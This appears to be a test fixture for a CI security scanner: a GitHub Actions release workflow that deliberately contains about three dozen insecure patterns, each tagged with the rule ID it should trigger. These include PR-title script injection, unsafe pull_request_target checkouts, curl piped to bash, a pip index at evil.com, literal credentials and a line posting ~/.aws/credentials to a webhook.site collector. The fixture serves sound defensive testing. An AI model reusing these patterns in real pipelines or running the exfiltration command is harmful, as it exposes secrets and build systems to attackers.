# Realistic-looking release workflow exhibiting every GHA-* failure mode.
# Sourced from patterns commonly seen in public repos; used as a fixture
# to assert that the scanner flags all twelve issues in one sweep.
name: Release

on:
  pull_request_target:
    types: [opened, synchronize]
  push:
    tags:
      - 'v*'
  # GHA-013: issue_comment trigger without author_association guard.
  issue_comment:
    types: [created]
  # GHA-009: workflow_run trigger that ingests an upstream artifact
  # without verifying its signature.
  workflow_run:
    workflows: ['Build']
    types: [completed]
  # GHA-036: caller picks the runner via workflow_dispatch input.
  # GHA-045: caller also picks the ref a downstream checkout uses.
  workflow_dispatch:
    inputs:
      runner:
        type: string
        required: true
      ref:
        type: string
        required: true

jobs:
  build:
    # GHA-012: self-hosted runner with no `ephemeral` label. State
    # leaks across jobs (PR -> deploy).
    runs-on: self-hosted
    # GHA-038: re-enables retired ::set-env / ::add-path workflow
    # commands across every step in the job.
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"
    # GHA-039: registry credentials embedded as literals in
    # services and container blocks. The values land in the
    # runner start banner of every build log.
    container:
      image: internal.registry/build:latest
      credentials:
        username: ci-deploy-bot
        password: hunter2-rotate-me
    services:
      postgres:
        image: postgres:14
        credentials:
          username: postgres
          password: postgres-literal-password
    steps:
      - name: Checkout PR head (unsafe)
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      # GHA-046: manual PR-head fetch from the shell, bypassing the
      # actions/checkout detector. Same threat surface as GHA-002 but
      # via ``gh pr checkout`` rather than ``ref:``.
      - name: Materialize PR via shell
        env:
          GH_TOKEN: ${{ github.token }}
        run: gh pr checkout ${{ github.event.number }}

      # GHA-040: pinned to a SHA the attacker landed under @v45 in
      # the tj-actions/changed-files compromise (CVE-2025-30066).
      # Curated registry catches it post-incident; rotate secrets
      # and bump to a clean SHA.
      - name: Detect changed files (compromised pin)
        uses: tj-actions/changed-files@0e58ed867288cdc3d92e6e2f9bb9b1bd0c4c78d2

      - name: Describe PR
        run: |
          echo "Building PR titled: ${{ github.event.pull_request.title }}"
          echo "Commit message: ${{ github.event.head_commit.message }}"

      - name: Install
        uses: actions/setup-node@v4
        with:
          node-version: 20

      # GHA-010: local action resolved against the (PR-controlled)
      # workspace under pull_request_target.
      - name: Lint PR
        uses: ./actions/lint-pr

      # GHA-011: cache key embeds an attacker-controllable PR title.
      - name: Restore build cache
        uses: actions/cache@v4
        with:
          path: ~/.cache/build
          key: build-${{ github.event.pull_request.title }}

      - name: Publish to AWS
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          # Pasted during a debugging session and never removed. Real key
          # shape — scanner must flag it.
          DEBUG_AWS_KEY: AKIAIOSFODNN7EXAMPLE
        run: npm run deploy

  # GHA-014: deploy-named job without environment: binding.
  # GHA-036: ``runs-on`` interpolates an attacker-controllable
  # ``workflow_dispatch`` input — the caller picks which runner
  # label (potentially a privileged self-hosted fleet) the deploy
  # lands on.
  # GHA-045: caller-controlled ``inputs.ref`` lands as the checkout
  # ref, so the dispatcher picks which tree runs with secrets.
  deploy:
    runs-on: ${{ inputs.runner }}
    needs: build
    steps:
      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
        with:
          ref: ${{ inputs.ref }}
      - run: echo "deploying to prod"

  # GHA-025: reusable-workflow ``uses:`` pinned to a floating tag.
  # GHA-034: ``secrets: inherit`` passes every caller secret to the
  # called workflow with no explicit allowlist.
  call-shared:
    uses: myorg/shared/.github/workflows/release.yml@v1
    secrets: inherit

  # GHA-026: container job runs with host-network + privileged docker,
  # mounting the host Docker socket — breaks runner isolation.
  container-escape:
    runs-on: ubuntu-latest
    container:
      image: debian:bookworm
      options: --privileged --network host -v /var/run/docker.sock:/var/run/docker.sock
    steps:
      - run: docker info

  ingest-upstream:
    # GHA-009: downloads an artifact from the workflow_run trigger
    # WITHOUT cosign verify / `gh attestation verify` / sha256sum -c.
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          run-id: ${{ github.event.workflow_run.id }}
      - run: ./build-output/install.sh
      # GHA-035: ``actions/github-script`` interpolates an attacker-
      # controllable PR title directly into the JS source — the same
      # threat as GHA-003 but over the github-script surface.
      - uses: actions/github-script@v7
        with:
          script: |
            const title = "${{ github.event.pull_request.title }}";
            await github.rest.issues.createComment({ body: title });

  # GHA-016: curl piped to bash.
  # GHA-017: docker run --privileged.
  # GHA-018: pip install from insecure source.
  # GHA-019: GITHUB_TOKEN written to file.
  # GHA-020: no vuln scanning step.
  insecure-build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install.sh | bash
      - run: docker run --privileged myimage
      - run: pip install --index-url http://evil.com/simple/ pkg
      - run: echo $GITHUB_TOKEN > token.txt
      # GHA-021: package install without lockfile enforcement.
      - run: npm install
      # GHA-022: dependency update bypasses lockfile pins.
      - run: pip install --upgrade requests
      # GHA-023: TLS verification bypass.
      - run: git config --global http.sslVerify false
      # GHA-027: evidence of malicious activity — credential exfil to
      # a webhook.site collector (distinct from hygiene warnings — a
      # real compromise indicator).
      - run: curl -d @~/.aws/credentials https://webhook.site/abc-123/collect
      # GHA-028: dangerous shell idiom — eval re-parses the value of
      # ``$DEPLOY_CMD`` as shell.
      - run: eval "$DEPLOY_CMD"
      # GHA-029: pip install from an unpinned git URL — lockfile
      # cannot protect against a moving branch head on the remote.
      - run: pip install git+https://example.com/internal/helper.git
      # GHA-031: retired ::set-output:: command channel — anything
      # in stdout that starts with `::` injects into the workflow's
      # output map.
      - run: echo "::set-output name=version::$VERSION"
      # TAINT-001: cross-step output flow. Producer step writes a
      # PR-title-derived value to $GITHUB_OUTPUT; consumer step
      # below interpolates it back into a shell command. GHA-003
      # already flags the producer's interpolation; TAINT-001
      # flags the actual cross-step injection at the consumer.
      - id: extract-title
        run: |
          echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT
      - run: |
          echo "Building PR titled: ${{ steps.extract-title.outputs.title }}"
      # TAINT-002: cross-job output propagation. The branch-extract
      # job below carries head_ref through a job output; the
      # consumer job interpolates it via needs.<id>.outputs.<name>.
      # Same injection pattern as TAINT-001 but spans the
      # ``jobs.<id>.outputs:`` boundary.
      # GHA-032: invokes a local script under the pull_request_target
      # trigger declared at the top of this workflow. The script
      # body resolves against the PR-controlled checkout.
      - run: bash ./scripts/setup.sh
      # GHA-033: secret value echoed to the build log. Log redaction
      # is best-effort and API readers see the raw stream.
      - name: Print release credentials
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: echo "Deploying with $DEPLOY_TOKEN"

  # GHA-030: requests `id-token: write` and invokes
  # aws-actions/configure-aws-credentials without an `environment:`
  # binding — any branch can trigger the cloud-role assumption.
  oidc-deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/release-oidc
          aws-region: us-east-1
      - run: aws s3 cp dist/ s3://release-bucket/ --recursive

  # TAINT-002: branch-extract surfaces an attacker-controllable
  # head_ref through a job-level output, and the build-info
  # consumer downstream interpolates it via
  # ``${{ needs.branch-extract.outputs.label }}`` into a shell
  # body. GHA-003 catches the inner ``${{ github.head_ref }}``
  # interpolation in the producer; TAINT-002 catches the actual
  # cross-job injection at the consumer.
  branch-extract:
    runs-on: ubuntu-latest
    outputs:
      label: ${{ steps.x.outputs.label }}
    steps:
      - id: x
        run: |
          echo "label=${{ github.head_ref }}" >> $GITHUB_OUTPUT
  build-info:
    needs: branch-extract
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Branch label: ${{ needs.branch-extract.outputs.label }}"

  # TAINT-003: forward a PR-controlled context expression
  # straight into a reusable workflow's ``with:`` block. The
  # callee receives the raw ``github.event.issue.title`` value
  # via ``${{ inputs.title }}`` and gets to decide whether to
  # sanitise it or not, audit responsibility shifts across the
  # caller-callee boundary that single-rule scanners can't see.
  call-build:
    uses: ./.github/workflows/build.yml
    with:
      title: ${{ github.event.issue.title }}
